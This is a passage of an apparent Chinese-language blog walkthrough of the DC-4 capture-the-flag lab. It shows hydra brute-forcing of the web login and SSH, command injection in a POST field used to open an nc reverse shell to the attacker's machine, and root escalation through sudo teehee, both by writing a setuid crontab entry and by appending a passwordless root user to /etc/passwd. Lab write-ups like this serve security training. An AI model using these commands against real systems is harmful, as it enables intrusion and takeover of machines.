know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br></pre></td></tr></table></figure>
<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84）</p>
<p>靶机：DC-4（IP：192.168.43.193）</p>
<h2 id="渗透测试-3"><a href="#渗透测试-3" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现开启了<code>22</code>和<code>80</code>端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nmap -p1-65535 -A 192.168.43.193</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-23 14:20 CST</span><br><span class="line">Nmap scan report for dc-4 (192.168.43.193)</span><br><span class="line">Host is up (0.00069s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:CA:EC:58 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.69 ms dc-4 (192.168.43.193)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds</span><br></pre></td></tr></table></figure>
<p>访问80端口，是一个登录页面，没有次数、验证码之类的限制</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-1.png" alt="4-1"></p>
<p>查看源码，<code>hydra</code>爆破</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>System Tools<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/styles.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Admin Information Systems Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"login.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">				Username:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">				Password:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/usr/share/wordlists# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.43.193 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 14:38:45</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking http-post-form://192.168.43.193:80/login.php:username=^USER^&amp;password=^PASS^:S=logout</span><br><span class="line">[80][http-post-form] host: 192.168.43.193   login: admin   password: happy</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 14:39:01</span><br></pre></td></tr></table></figure>
<p>获得<code>用户名admin - 密码happy</code>。登录之后可以进行3个操作：<code>ls -l、du -h、df -h</code>，可能存在命令执行漏洞</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-2.png" alt="4-2"></p>
<p>抓包，发现可以直接修改要执行的命令并直接执行</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-3.png" alt="4-3"></p>
<p>现在直接通过<code>nc</code>命令反弹一个shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radio=nc -e /bin/sh 192.168.43.84 3737&amp;submit=Run</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-4.png" alt="4-4"></p>
<p>如果不支持<code>-e</code>参数，也可以创建远程shell，命令与DC3中一样，但是此处好像不行，到<code>2&gt;</code>处就断了，不再去看</p>
<p>意义：创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口3737上。至此，我们已经把netcat的输出重定向到fifo文件中。</p>
<p>说明：从网络收到的输入写到fifo文件中，cat 命令读取fifo文件并且其内容发送给sh命令，sh命令进程受到输入并把它写回到netcat。netcat 通过网络发送输出到client</p>
<p>至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh 2&gt;&amp;1 | nc 192.168.43.84 3737 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
<p>回归正题，拿到shell之后，切换到<code>/home</code>目录下，发现有3个用户<code>charles,jim,sam</code>，只有<code>jim</code>目录下有东西，在<code>/home/jim/backups/</code>目录下发现密码文件<code>old-passwords.bak</code>，里面存放着很多密码，除此之外没有其他有用信息。回到上级目录，发现<code>mbox</code>其他人没有权限读，十分可疑。那应该就是要获取<code>jim</code>的密码，ssh登录然后查看了</p>
<p>将密码文件复制下来写入<code>dc4_passwords.txt</code>，前面扫描端口发现还开放22号端口，那么接下来就用<code>hydra</code>爆破<code>ssh</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# hydra -l jim -P dc4_passwords.txt ssh://192.168.43.193</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 16:10:00</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.43.193:22/</span><br><span class="line">[STATUS] 177.00 tries/min, 177 tries in 00:01h, 76 to do in 00:01h, 16 active</span><br><span class="line">[22][ssh] host: 192.168.43.193   login: jim   password: jibril04</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 1 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 1 target did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 16:11:48</span><br></pre></td></tr></table></figure>
<p>ssh登录成功，查看mbox</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# ssh jim@192.168.43.193</span><br><span class="line">The authenticity of host &apos;192.168.43.193 (192.168.43.193)&apos; can&apos;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &apos;192.168.43.193&apos; (ECDSA) to the list of known hosts.</span><br><span class="line">jim@192.168.43.193&apos;s password: </span><br><span class="line">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span><br><span class="line"></span><br><span class="line">The programs includ...</span><br><span class="line"></span><br><span class="line">jim@dc-4:~$ ls</span><br><span class="line">backups  mbox  test.sh</span><br><span class="line">jim@dc-4:~$ cat mbox</span><br><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with local (Exim 4.89)</span><br><span class="line">	(envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">	id 1hCiQe-0000gc-EC</span><br><span class="line">	for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a test.</span><br></pre></td></tr></table></figure>
<p>切换到<code>/var/mail</code>下获得<code>Charles</code>的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:~$ cd /var/mail</span><br><span class="line">jim@dc-4:/var/mail$ ls</span><br><span class="line">jim</span><br><span class="line">jim@dc-4:/var/mail$ cat jim</span><br><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with local (Exim 4.89)</span><br><span class="line">	(envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">	id 1hCjIX-0000kO-Qt</span><br><span class="line">	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&apos;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure>
<p>登录<code>charles</code>，尝试命令<code>sudo -l</code>时却提示用<code>teehee</code>提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:/var/mail$ su charles</span><br><span class="line">Password: </span><br><span class="line">charles@dc-4:/var/mail$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
<p>参考别人的文章， 有两种方法：</p>
<p>方法一：</p>
<p>①<code>crontab</code>：是一个计划表，可以定时地执行命令。而需要命令立即执行只要设置为五个<code>*</code>就可以：<code>* * * * *</code></p>
<p>②<code>teehee</code>：是一个命令，但暂时未弄清楚功能</p>
<p>首先我们进行测试，创建文件666，改变他的权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># sudo teehee /etc/crontab</span><br><span class="line"># * * * * * root chmod 4777 /home/charles/666</span><br><span class="line"></span><br><span class="line">charles@dc-4:~$ touch 666</span><br><span class="line">charles@dc-4:~$ ls -la 666</span><br><span class="line">-rw-r--r-- 1 charles charles 0 Sep 23 21:01 666</span><br><span class="line">charles@dc-4:~$ sudo teehee /etc/crontab</span><br><span class="line">* * * * * root chmod 4777 /home/charles/666	#此条命令输入一次，回车就可以</span><br><span class="line">* * * * * root chmod 4777 /home/charles/666</span><br><span class="line">^C</span><br><span class="line">charles@dc-4:~$ ls -la 666</span><br><span class="line">-rwsrwxrwx 1 charles charles 0 Sep 23 21:01 666</span><br></pre></td></tr></table></figure>
<p>现在可以去改变<code>/bin/sh</code>的权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ ls -la /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -&gt; dash</span><br><span class="line">charles@dc-4:~$ ls -la /bin/dash</span><br><span class="line">-rwxrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash</span><br><span class="line">charles@dc-4:~$ sudo teehee /etc/crontab</span><br><span class="line">* * * * * root chmod 4777 /bin/sh</span><br><span class="line">* * * * * root chmod 4777 /bin/sh</span><br><span class="line">^C</span><br><span class="line">charles@dc-4:~$ ls -la /bin/dash</span><br><span class="line">-rwsrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash</span><br></pre></td></tr></table></figure>
<p>可以看到<code>/bin/dash</code>权限改变成功，接下来直接使用<code>/bin/sh</code>，找flag并读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ /bin/sh</span><br><span class="line"># find / -name &quot;*flag*&quot;</span><br><span class="line">....</span><br><span class="line">/sys/module/scsi_mod/parameters/default_dev_flags</span><br><span class="line">/root/flag.txt</span><br><span class="line">/proc/sys/kernel/acpi_video_flags</span><br><span class="line">/proc/kpageflags</span><br><span class="line"># cat /root/flag.txt	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
<p>方法二：</p>
<p><code>teehee -a</code>参数可以不覆盖地向指定文件添加内容，通过这个向<code>passwd</code>中添加一个用户</p>
<p>Ps：查看passwd，root用户的登录shell为<code>/bin/bash</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ tail -3 /etc/passwd</span><br><span class="line">jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash</span><br><span class="line">sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</span><br><span class="line">Debian-exim:x:108:112::/var/spool/exim4:/bin/false</span><br><span class="line">charles@dc-4:~$ echo &quot;Knlvre_hack::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">Knlvre_hack::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:~$ tail -3 /etc/passwd</span><br><span class="line">sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</span><br><span class="line">Debian-exim:x:108:112::/var/spool/exim4:/bin/false</span><br><span class="line">Knlvre_hack::0:0:::/bin/bash</span><br></pre></td></tr></table></figure>
<p>参数解释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#如：admin:x:0:0::/home/admin:/bin/bash</span><br><span class="line"></span><br><span class="line">#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br></pre></td></tr></table></figure>
<p>添加成功之后，由于没有设置密码，所以直接登录，直接是root权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ su Knlvre_hack</span><br><span class="line">root@dc-4:/home/charles# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@dc-4:/home/charles# cat /root/flag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>Reference</strong></p>
<p><a href="https://blog.csdn.net/auuuuuuuu/article/details/97832336" target="_blank" rel="noopener">https://blog.csdn.net/auuuuuuuu/article/details/97832336</a></p>
<p><a href="https://blog.51cto.com/5437315/2420079" target="_blank" rel="noopener">https://blog.51cto.com/5437315/2420079</a></p>
<p><a href="https://www.cnblogs.com/Q--T/p/7864795.html" target="_blank" rel="noopener">https://www.cnblogs.com/Q--T/p/7864795.html</a></p>
<p><a href="https://www.anquanke.com/post/id/178658" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178658</a></p>
<p><a href="https://blog.csdn.net/Z_Grant/article/details/100866879" target="_blank" rel="noopener">https://blog.csdn.net/Z_Grant/article/details/100866879</a></p>
<p><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/188989.html</a></p>
<p><a href="https://gtfobins.github.io/gtfobins/git/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/git/</a></p>
<p><a href="https://www.cnblogs.com/daxueba-ITdaren/p/10811791.html" target="_blank" rel="noopener">https://www.cnblogs.com/daxueba-ITdaren/p/10811791.html</a></p>

            </div>
            <hr/>

            
            <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.88rem;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff;
        background-color: #22AB38;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff;
        background-color: #019FE8;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close"><i class="fa fa-close"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs">
